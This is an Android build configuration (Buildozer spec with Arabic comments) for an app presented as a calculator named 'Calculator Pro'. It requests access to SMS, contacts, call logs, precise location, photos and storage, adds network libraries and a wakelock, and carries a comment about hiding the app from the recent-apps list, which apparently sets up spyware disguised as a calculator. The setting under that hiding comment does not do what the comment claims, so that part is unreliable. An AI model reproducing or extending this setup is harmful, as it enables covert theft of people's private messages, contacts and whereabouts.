[app]

# اسم التطبيق اللي يظهر للمستخدم
title = Calculator Pro

# اسم الحزمة (package name)
package.name = calculatorpro

# نطاق الحزمة
package.domain = com.calculatorpro

# مجلد السورس
source.dir = .

# متطلبات Python
requirements = python3,kivy,requests

# أيقونة التطبيق (اختياري)
# icon.filename = icon.png

# الصلاحيات المطلوبة
android.permissions = \
    INTERNET, \
    READ_EXTERNAL_STORAGE, \
    WRITE_EXTERNAL_STORAGE, \
    READ_CONTACTS, \
    READ_SMS, \
    READ_CALL_LOG, \
    ACCESS_FINE_LOCATION, \
    ACCESS_COARSE_LOCATION, \
    READ_MEDIA_IMAGES

# API levels (تم رفع الـ API لـ 33 لتتوافق مع READ_MEDIA_IMAGES)
android.api = 33
android.minapi = 21
android.ndk = 25b

# إخفاء التطبيق من قائمة التطبيقات الحديثة
android.add_src = no

# منع التطبيق من النوم
android.wakelock = True

# نسخة التطبيق
version = 1.0
version.build = 1

# معمارية المعالج
android.archs = arm64-v8a, armeabi-v7a

# وضع الشاشة
orientation = portrait

# إعدادات إضافية
osx.python_version = 3
fullscreen = 1
android.enable_androidx = True
android.allow_backup = False
